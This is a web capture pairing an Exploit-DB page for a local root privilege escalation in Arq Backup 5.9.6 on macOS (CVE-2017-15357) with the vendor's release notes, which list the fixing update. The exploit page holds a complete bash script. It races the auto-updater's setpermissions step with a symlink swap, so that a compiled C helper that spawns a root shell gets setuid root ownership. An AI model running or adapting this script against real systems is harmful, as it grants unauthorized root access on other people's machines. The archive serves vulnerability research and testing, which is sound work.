=== Content from www.exploit-db.com_5599a883_20250125_154426.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Arq 5.9.6 - Local Privilege Escalation

#### EDB-ID:

###### 43218

#### CVE:

###### [2017-15357](https://nvd.nist.gov/vuln/detail/CVE-2017-15357)

---

**EDB Verified:**

#### Author:

###### [Mark Wadham](/?author=8936)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [macOS](/?platform=macos)

#### Date:

###### 2017-12-06

---

**Vulnerable App:**

```
# Arq Backup from Haystack Software is a great application for backing up macs and
# windows machines. Unfortunately versions of Arq for mac before 5.9.7 are
# vulnerable to a local root privilege escalation exploit.

# The updater binary has a "setpermissions" function which sets the suid bit and
# root ownership on itself but it suffers from a race condition that allows you to
# swap the destination for these privileges using a symlink.

# We can exploit this to get +s and root ownership on any arbitrary binary.

# Other binaries in the application also suffer from the same issue.

# This was fixed in Arq 5.9.7.

# https://m4.rkw.io/arq_5.9.6.sh.txt
# 49cc82df33a3e23245c7a1659cc74c0e554d5fdbe2547ac14e838338e823956d
# ------------------------------------------------------------------------------
#!/bin/bash

##################################################################
###### Arq <= 5.9.6 local root privilege escalation exploit ######
###### by m4rkw - https://m4.rkw.io/blog.html                 ####
##################################################################

vuln=`ls -la /Applications/Arq.app/Contents/Library/LoginItems/\
Arq\ Agent.app/Contents/Resources/arq_updater |grep 'rwsr-xr-x' \
|grep root`

cwd="`pwd`"

if [ "$vuln" == "" ] ; then
  echo "Not vulnerable - auto-updates not enabled."
  exit 1
fi

cat > arq_596_exp.c <<EOF
#include <unistd.h>
int main()
{
  setuid(0);
  seteuid(0);
  execl(
    "/bin/bash","bash","-c","rm -f $cwd/arq_updater;/bin/bash",
    NULL
  );
  return 0;
}
EOF

gcc -o arq_596_exp arq_596_exp.c
rm -f arq_596_exp.c

ln -s /Applications/Arq.app/Contents/Library/LoginItems/\
Arq\ Agent.app/Contents/Resources/arq_updater

./arq_updater setpermissions &>/dev/null&
rm -f ./arq_updater
mv arq_596_exp ./arq_updater

i=0
timeout=10

while :
do
  r=`ls -la ./arq_updater |grep root`
  if [ "$r" != "" ] ; then
    break
  fi
  sleep 0.1
  i=$((i+1))
  if [ $i -eq $timeout ] ; then
    rm -f ./arq_updater
    echo "Not vulnerable"
    exit 1
  fi
done

./arq_updater

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://m4.rkw.io/blog/cve201715357-local-root-privesc-in-arq-backup--596.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.arqbackup.com_e0d17f0f_20250125_154424.html ===

# Release Notes for Arq Backup Version 5.22

October 28, 2021

## Changes

* Changed the Google Drive OAuth process to adapt to Google's recent change in what HTTP headers are allowed.

# Release Notes for Arq Backup Version 5.21.1

## Changes

* Changed Arq 7 message to a "user notification" that's less intrusive. Click on it to see the full Arq 7 message.

# Release Notes for Arq Backup Version 5.21

February 17, 2021

## Changes

* Updated copyright to say 2021.
* Changed 'Do Not Downgrade' warning to offer a Continue Anyway button in case you installed a newer version of Arq inadvertently and want to switch back before any data were changed.
* Added a message about Arq 7 availablility.
* Added debug logging commands for use in counting B2 transactions in the agent log.

# Release Notes for Arq Backup Version 5.20

October 7, 2020

## Fixed Issues

* Modified auto-updater to work with Apple's recent macOS updates.

# Release Notes for Arq Backup Version 5.19.2

October 5, 2020

## Changes

* Added a workaround for Google Drive's new 500,000-item per-folder limit.

# Release Notes for Arq Backup Version 5.19.1

June 5, 2020

## Fixed Bugs

* Reverted eu-north-1 AWS hostname from s3.eu-north-1.amazonaws.com to s3-eu-north-1-amazonaws.com to be compatible with some existing users' configurations.

# Release Notes for Arq Backup Version 5.19

June 4, 2020

## Changes

* Added 3 new AWS regions -- Bahrain, Milan, and Cape Town.

# Release Notes for Arq Backup Version 5.18

April 19, 2020

## Changes

* Changed OAuth flow for Google Drive and Google Cloud Storage to use an external web browser to work around unknown changes at Google that were returning a 400 error.

# Release Notes for Arq Backup Version 5.17.3

March 14, 2020

## Changes

* Reverted the change to reduce the requested Google Drive OAuth scope because customers are manually copying Arq backup data from other Google Drive accounts and Arq is unable to read it.
* Ignore invalid quota information given by OneDrive business accounts.

# Release Notes for Arq Backup Version 5.17.2

November 21, 2019

## Modified Features

* Reduced the requested Google Drive OAuth scope to only read/write files Arq has created.

# Release Notes for Arq Backup Version 5.17.1

October 8, 2019

## Modified Features

For macOS Catalina:

* Changed distribution method from dmg file to zip file.
* Changed first-run behavior to prompt the user to move Arq to the Applications folder if automatic move fails.
* Notarized the app as required by Apple.

# Release Notes for Arq Backup Version 5.16.2

September 30, 2019

## Added Features

* Added support for Wasabi's new [eu-east-2](https://wasabi-support.zendesk.com/hc/en-us/articles/360015106031-What-are-the-service-URLs-for-Wasabi-s-different-regions-) region.

## Fixed Issues

* Added a workaround for bogus responses from Dropbox's get\_space\_usage API.
* Fixed an issue that could potentially cause "The authorization header is malformed" when backing up to AWS.

# Release Notes for Arq Backup Version 5.16.1

July 16, 2019

## Fixed Issues

* Fixed an issue that would cause inaccurate 'trial expired' error messages for users with older Arq licenses.
* Fixed an issue which could cause AWS error 'The authorization header is malformed; Invalid credential date. Date is not the same as X-Amz-Date.'
* Fixed an issue where the Quit Arq button doesn't work if you've just installed Arq, canceled adding a destination, and quit Arq Agent.
* If computer switches to a disallowed network during budget enforcement, abort the budget enforcement.

# Release Notes for Arq Backup Version 5.16

February 19, 2019

## Added Features

* Added support for Wasabi's new eu-central-1 region.

# Release Notes for Arq Backup Version 5.15.3

February 2, 2019

## Fixed Issues

* Fixed an issue that could cause bogus error messages during validation of the form "requested bytes at 0 length 116 but got 0 bytes".
* Fixed an issue where Arq reported a "too many requests" error from OneDrive/SharePoint instead of waiting and retrying.

# Release Notes for Arq Backup Version 5.15.2

January 30, 2019

## Fixed Issues

* Fixed several issues that made Arq difficult to read in macOS dark mode, including the initial setup pop-ups, the edit-excluded-files dialog, and the reflog viewer.
* Fixed help buttons that failed to open the proper help page.

# Release Notes for Arq Backup Version 5.15.1

January 29, 2019

## Fixed Issues

* Fixed an issue that could cause inaccurate 'trial expired' messages when errors occur during backup, even if there's a valid license installed.

# Release Notes for Arq Backup Version 5.15

January 28, 2019

## New Features

* Added support for OneDrive for Business and Office 365 accounts. Now you can use any Microsoft account to store your Arq backups in OneDrive.
* Added support for SharePoint as a backup destination.

## Fixed Issues

* Fixed an issue that prevented restoring from a backup set stored at Wasabi that was originally created at Amazon Drive.
* Fixed an issue where multiple S3-compatible destinations weren't being populated correctly in the "RESTORE FILES" section of the source list.
* Changed the timeout for SFTP writes to 5 minutes.

# Release Notes for Arq Backup Version 5.14.3

December 14, 2018

## Added Features

* Added support for new AWS regions eu-north-1 (Stockholm) and ap-northeast-3 (Osaka-Local).

## Fixed Issues

* Fixed a OneDrive OAuth2 issue that caused a "We're unable to complete your request" error when you try to add OneDrive as a destination.

# Release Notes for Arq Backup Version 5.14.2

December 4, 2018

## Fixed Issues

* If Wasabi returns a 503 error with an unexpected non-XML response body, sleep and retry instead of failing.
* Added a workaround for Mojave where sometimes 2 Arq Agents could run for the same user at the same time. Changed the way Arq Agent checks for an already-running Arq Agent.

# Release Notes for Arq Backup Version 5.14.1

October 24, 2018

## Fixed Issues

* Fixed screens which showed text in the wrong color when macOS is in dark mode.
* Do not allow entering a bucket name containing a slash.
* Show size on disk in restore outline view.
* Updated images in the help docs.
* For S3 and S3-compatible destinations, send the Content-MD5 request header when doing a PUT instead of reading the Etag in the response header because some S3-compatible servers (e.g. minio) don't send an S3-compatible Etag response.

# Release Notes for Arq Backup Version 5.14

September 25, 2018

## New Features

* Added a guide for giving Arq permission in Mojave to back up all files.

## Fixed Issues

* Fixed an issue where an S3-compatible destination with disallowed URL characters in the access key ID would not show all backup sets under the "RESTORE FILES" section.
* Fixed an issue where objects intended for Glacier are initially created with Standard-IA storage class instead of Standard storage class.
* If not on an allowed network, abort validation.
* Fixed an issue where, in the case of multiple Wasabi destinations, not all Wasabi destinations were listed under "RESTORE FILES".

# Release Notes for Arq Backup Version 5.13.2

August 23, 2018

## Fixed Issues

* Fixed an issue with SFTP where in some cases, if there was a problem connecting to the SFTP server when writing a file, Arq would think it successfully wrote the file and would therefore fail to retry when the SFTP server became available.

# Release Notes for Arq Backup Version 5.13.1

August 17, 2018

## New Features

* Added support for B2 [application keys](https://www.backblaze.com/b2/docs/application_keys.html).

## Fixed Issues

* Fixed an issue in search results where directories incorrectly showed a modification date of January 1, 1970.

# Release Notes for Arq Backup Version 5.12.2

July 17, 2018

## Fixed Issues

* Fixed an issue where multiple OneDrive accounts were sometimes not all displayed in the RESTORE FILES section of the main window.
* Fixed an issue where errors with Arq's cache database could cause Arq to repeatedly retry and requery for data from the destination instead of logging the error and aborting the backup.
* Fixed an issue which caused Arq to display an error message when calculating AWS usage if the IAM user doesn't have Glacier-related permissions.

# Release Notes for Arq Backup Version 5.12.1

June 26, 2018

## New Features

* Added support for Wasabi's new us-west-1 region.

## Fixed Issues

* Fixed an issue where an incorrect error message is displayed when updating S3 credentials for a destination.
* Fixed an issue which could cause S3 requests to fail when the computer's time is later than GMT and GMT time is still the previous day.
* Fixed an issue where a database of files identified by validation to rescan wasn't being properly deleted after rescan, causing file scanning to slow down.
* Fixed a crash that could occur if Dropbox unexpectedly fails to return a content hash for an uploaded file.
* Added additional email authentication "SASL LOGIN".

# Release Notes for Arq Backup Version 5.11.3

April 5, 2018

## Changes

* When adding a Wasabi destination, if the Wasabi user doesn't have 'ListAllMyBuckets' permission, Arq prompts for a bucket name to use instead of providing a list to choose from.
* Added a workaround for occasional B2 "java.net.SocketTimeoutException" errors.
* Truncate long file paths in the middle in the search results window to make it easier to find the file you're looking for.
* Fixed an issue where script output wasn't being added to the session log.
* If there's an error reading extended attributes of ACL of a file, proceed to backup the file contents anyway.

## Fixed Issues

* Fixed an issue where the 'Enforce Budget Now' menu item would fail to start budget enforcement.
* Fixed an issue which would cause Arq's "arqs3glacierrestorer" helper program to prompt for keychain access permission (twice) the first time you restore from S3/Glacier.
* Fixed an issue where validation could report errors for missing objects in a backup set originally created by Arq 4.
* Fixed an issue where restore could stop with an error message instead of reporting the error and continuing.
* If there's an error when sending the Arq log file, report the error.

# Release Notes for Arq Backup Version 5.11.2

January 26, 2018

## Fixed Issues

* Fixed a crash that could occur when manually updating Arq to a new version.

# Release Notes for Arq Backup Version 5.11.1

January 25, 2018

## Fixed Issues

* Fixed an issue that could cause Arq's "arqcommitter" helper program to unexpectedly use large amounts of memory.

# Release Notes for Arq Backup Version 5.11

January 22, 2018

## Changes

* Reworked the validation process. Instead of validation during a backup session, Arq now validates data in the background, using multiple threads for faster performance.
* Added a Change Credentials button in the destination preferences window for B2 so you can easily change the application key.
* Added support for AWS Paris region.
* Added support for Glacier in the AWS Singapore region.
* When creating a B2 bucket, set the lifecycle policy to only keep the last version of a file.

## Fixed Issues

* Added a workaround to avoid crashing on bogus login items caused by a High Sierra bug.
* Fixed an issue where, if directory data from the previous backup record is missing, Arq would generate many, many errors. Now it logs 1 error.
* Changed helper programs to exit if they're not launched by Arq or Arq Agent as appropriate.
* Allow whitespace characters at the beginning and end of passwords.
* Fixed an issue where Arq might try to download a just-uploaded index file which can cause not-found errors in S3 because of S3 latency issues.

# Release Notes for Arq Backup Version 5.10

November 20, 2017

## Fixed Issues

* Fixed a security vulnerability in the restorer helper binaries.

# Release Notes for Arq Backup Version 5.9.7

November 18, 2017

## Fixed Issues

* Fixed an issue that could cause the auto-updater to fail to set permissions and relaunch Arq Agent after update.
* Fixed a security vulnerability in the auto-updater functionality.
* Show folder sizes when browsing backup records.
* Added a workaround for Amazon Drive's behavior of closing connections without responding.

# Release Notes for Arq Backup Version 5.9.6

November 14, 2017

## Fixed Issues

* Fixed an issue that could cause Arq to fail to show the OAuth authentication window when adding a Google Drive, Google Cloud Storage, Amazon Drive, Dropbox, or OneDrive destination on later versions of macOS High Sierra.
* Fixed an issue that could cause Arq to fail to show the contents of directories in a backup record.

# Release Notes for Arq Backup Version 5.9.5

November 13, 2017

## Fixed Issues

* Fixed backup scheduling issues.
* Fixed a security issue with automatic update.
* When thinning backups, always keep the oldest backup record.
* If OneDrive returns a "quotaLimitReached" error, report the error and abort the backup.
* If no changes were found backing up and the most recent backup record was "in-progress" (perhaps because the previous backup aborted) remove the in-progress backup record.
* Improved the error message when Arq gets an error trying to read extended attributes.
* Improved performance of browsing backup records.

# Release Notes for Arq Backup Version 5.9.4

September 30, 2017

## Fixed Issues

* Fixed an issue where deleting a backup set didn't include deleting all related Glacier objects.
* Fixed an issue where adding a Google Cloud Storage target could cause Arq to freeze if an error occurs talking to Google Cloud Storage.
* Fixed an issue where a transient error during deleting unreferenced objects could cause the task to abort instead of retry.
* Fixed an issue where, if not all items are checked under a "root" folder in the edit-backup-selections window, the root item didn't have a "mixed-case" (hyphen) checkmark.
* Switched to V2 API for getting Dropbox quota info (all other API calls were already V2) because Dropbox retired the V1 API. This may cause issues for Dropbox for Teams users if the Dropbox API doesn't return team space-available information.

# Release Notes for Arq Backup Version 5.9.3

September 3, 2017

## Fixed Issues

* Fixed an issue where an unexpected error type during backup could cause the backup process to stop.

# Release Notes for Arq Backup Version 5.9.2

August 23, 2017

## Fixed Issues

* Fixed an issue that could cause Arq to drop the oldest backup record if "thin backups from hourly to daily to weekly" is checked in the preferences.
* Use the correct (custom) port number when updating credentials for an S3-compatible destination.

# Release Notes for Arq Backup Version 5.9.1

August 11, 2017

## Fixed Issues

* Added a workaround for when B2 returns unexpected data in a list-file-names response.
* If a timeout or other error occurs when writing a temporary file to an SFTP server (before moving it atomically to its final location), attempt to delete the temporary file.
* Fixed an issue where Arq would download much more Dropbox data than necessary when validating backup records.
* If Amazon Drive returns a "Next token is expired" error when listing the contents of a folder, restart the folder listing.
* If the S3 IAM user doesn't have permission to get the list of existing buckets, ask if it should continue anyway using the bucket name entered.
* Rearranged the destination preferences window so it's short enough to fit on a 12" MacBook.

# Release Notes for Arq Backup Version 5.9

July 27, 2017

## New Features

* Added [Backblaze B2](https://www.backblaze.com/b2/cloud-storage.html) (super-cheap) storage as an option for backup destination.
* Added [Wasabi](https://wasabi.com) (super-cheap, S3-style storage) as an option for backup destination.
* Added a [storage comparison guide](https://www.arqbackup.com/documentation/pages/strategy.html) for help in choosing a destination for your backups.

## Fixed Issues

* Fixed an issue where the entered bucket name for an S3-compatible destination wasn't being used properly.
* If a directory disappears during scanning, don't log an error about it.
* Fixed an issue that could cause re-uploading of data when validating very old backups (created by Arq 3).
* Don't allow deleting of in-progress backup record.
* If nothing has been configured for backup, log an error instead of doing nothing.
* Fixed incorrect label in the edit-destination dialog.
* Do not write an error to the session log if the user manually stopped the backup.

# Release Notes for Arq Backup Version 5.8.6

June 7, 2017

## Fixed Issues

* Fixed an issue that caused Arq to set a file's permissions to 0 when restoring files from a Windows backup to a Mac.
* Fixed an issue that caused Arq to show the wrong metadata when an Amazon Drive backup set was selected under the "RESTORE FILES" section.
* Fixed an issue where Arq would fail to clear the cache for Glacier objects before validating backup data.
* Fixed a privacy issue where a third party who already has access to your backup data can identify the presence of a file in an encrypted backup, as long as the third party has a copy of the original, unencrypted file.
* Fixed an issue where Arq incorrectly rebuilt missing index files for pack files. Rewrite any pack index files that may have been improperly rebuilt in the past.

# Release Notes for Arq Backup Version 5.8.5

May 23, 2017

## Fixed Issues

* Fixed an issue that could cause the remove-unreferenced-objects process to delete data it shouldn't delete for AWS, Google Cloud Storage, and Google Drive backups.

# Release Notes for Arq Backup Version 5.8.4

May 21, 2017

## Changes

* Disabled budget enforcement until we resolve the issues with it.

## Fixed Issues

* Fixed an issue that prevented adding Google Drive as a destination if there was less than 160 bytes free (because it tried to write a README.TXT file and failed).

# Release Notes for Arq Backup Version 5.8.3

May 8, 2017

## Fixed Issues

* When setting the head backup record ID, if there's an error reading the current head backup record ID, log the error and continue.
* Fixed an issue that could cause Arq to restore from Glacier using Standard retrieval tier when Bulk retrieval tier was selected.

# Release Notes for Arq Backup Version 5.8.2

May 2, 2017

## Fixed Issues

* Fixed an issue that was causing 'object not found' errors when attempting to restore from Glacier using Arq 5.8.1.
* Fixed an issue that could cause "invalid XAttrSet header" error when restoring extended attributes of a file from Glacier.

# Release Notes for Arq Backup Version 5.8.1

April 27, 2017

## Changes

* If an SFTP server is unreachable for 2 minutes, fail the backup session so we can move on to other destinations (if any).
* Added detail-level logging which describes in detail how Arq decides which backup records to keep when the "thin backups" option is checked.
* Changed Arq's caching mechanism for S3, S3-compatible, Google Drive and Google Cloud Storage to only query (as necessary) for 1/256th of the objects in the objects directory at a time, to improve cache-loading performance.

## Fixed Issues

* Added a check so that Arq never creates a directory in /Volumes, just in case a network share was being used as a destination and is suddenly unmounted.
* Fixed an issue that could cause Arq to calculate chunks differently when validating old backup data, which caused unnecessary re-uploading of data.

# Release Notes for Arq Backup Version 5.7.9

April 3, 2017

## Fixed Issues

* Fixed an issue which could cause the 'pause backup while on battery power' to not take effect.
* Fixed an issue which could cause Arq to enforce a budget when no budget was configured.

# Release Notes for Arq Backup Version 5.7.8

March 22, 2017

## Changes

* If you check "prevent computer sleep during backup" but you pause Arq manually (or Arq pauses because you checked "pause backup while on battery power", Arq won't prevent sleep while paused.

## Fixed Issues

* Switched back to Dropbox V1 API for getting quota information because the V2 API returns incorrect results for some users, resulting in 'not enough space' errors from Arq.
* Fixed an issue with calculating free space at Dropbox.
* Fixed an issue which could object-not-found errors when restoring from Glacier.
* Added a workaround for a date-parsing problem with Dropbox.
* If Google Drive returns the error 'download quota for this file has been exceeded', wait and retry.
* Fixed an issue that could cause an email report to say '0 errors' when in fact there were errors.

# Release Notes for Arq Backup Version 5.7.7

March 5, 2017

## Changes

* Disabled Glacier Expedited retrieval tier for now due to incorrect cost estimation.

## Fixed Issues

* Fixed an issue that could cause errors during object cleanup for legacy Glacier backups.

# Release Notes for Arq Backup Version 5.7.6

March 1, 2017

## Fixed Issues

* Fixed an issue that could cause Arq to delete objects during "remove unreferenced objects" that shouldn't be deleted.

# Release Notes for Arq Backup Version 5.7.5

## Fixed Issues

* Changed to Dropbox V2 API.

# Release Notes for Arq Backup Version 5.7.4

February 27, 2017

## Fixed Issues

* Changed to Dropbox V2 API.
* Don't log an error if the source folder is empty; just skip it.
* Fixed an issue that could cause incorrect results when calculating total backup set size for OneDrive and Dropbox.
* If Arq is backing up to a network share and the network share disappears, abort the backup.
* Fixed an issue that could cause "object not found" errors when restoring from Glacier.
* Fixed an issue that could cause Arq to show no backup records for another computer if you'd previously browsed that computer (and thereby caching directory contents), before that computer had done any backups at all.
* Fixed an issue that could cause folder modification times to be restored incorrectly.

# Release Notes for Arq Backup Version 5.7.3

January 25, 2017

## Fixed Issues

* Fixed an error that could occur at backup time if an individual file is configured as a backup item in Arq.
* Fixed an issue that prevented Arq from seeing Google Drive backups in the hidden "appDataFolder".
* Fixed an issue caused file move errors when saving configuration changes when backing up to a local folder.

# Release Notes for Arq Backup Version 5.7

January 23, 2017

## Improvements

* Updated Glacier restore process to allow selection of retrieval tier (Bulk, Standard or Expedited).
* Added a button to show which items were excluded at the time the backup record was created.
* Migrated to using Google Drive's V3 API.

## Fixed Issues

* Fixed an issue that could cause incorrect size numbers to be displayed in a backup record if files were modified during the backup session.
* Fixed an issue that would cause Arq to clear too much of its cache when browsing other computers' backups.
* Remove any space characters around the entered SFTP hostname when adding an SFTP destination.
* Fixed an issue that could cause errors like "failed to make temp file with template ...: No such file or directory".
* Fixed an issue that could cause not-found errors when restoring from an older SFTP backup.
* Fixed an issue that could cause "mkstemp" errors during backup to a local folder.

# Release Notes for Arq Backup Version 5.6.2

December 30, 2016

## Improvements

* Added support for new AWS London region.

## Fixed Issues

* Fixed an issue which prevented some Google single-signon accounts from working with Arq.
* Fixed an issue which could cause excessive memory usage when encountering certain file data.
* Fixed an issue where Arq would report an error if a file disappeared between reading the directory and attempting to read the file.
* Fixed an issue that could cause a crash (with exception "namedTrees must be empty") if there was an error processing a directory.

# Release Notes for Arq Backup Version 5.6.1

December 14, 2016

## Improvements

* Added support for new AWS Mumbai region.
* Added support for new AWS Canada region.

## Fixed Issues

* Fixed an issue that was preventing the "fixed transfer rate" setting from having any effect on network usage.
* Fixed an issue that prevented adopting a backup set if there was any error with reading the backup set.
* Added a workaround for the 25,000-file limit issue when backing up to Dropbox.
* Changed Arq to keep a maximum of 100 backup session logs.
* Fixed an issue that could cause a crash with the message 'last path on the stack doesn't match'.
* Fixed an issue that could cause Arq to log errors when files disappear between scanning and uploading phases.
* Fixed an issue which could cause "HTTP error 400" when attempting to back up to Google Drive or Google Cloud Storage.

# Release Notes for Arq Backup Version 5.5.2

November 10, 2016

## Fixed Issues

* Fixed an issue that could cause an 'object cannot be nil' crash during backup.
* Reduced memory usage during backup.
* Fixed an issue that could cause deleting legacy Glacier vaults to fail if the computer is using a non-US locale.

# Release Notes for Arq Backup Version 5.5.1

October 25, 2016

## Fixed Issues

* Fixed an issue that could Arq to re-upload data unnecessarily during backup validation.
* Changed the suggested Google Cloud Storage bucket name to start with a letter instead of a number.
* Added a workaround for OneDrive HTTP 413 errors: Since OneDrive sometimes fails when Arq uploads larger files (though well under the API file limit), Arq splits file data into smaller chunks for OneDrive uploads.

# Release Notes for Arq Backup Version 5.5

October 21, 2016

## Improvements

* Added support for Google Cloud Storage's new Coldline option.
* Added support for Google Cloud Storage multi-region and single region locations.

# Release Notes for Arq Backup Version 5.4

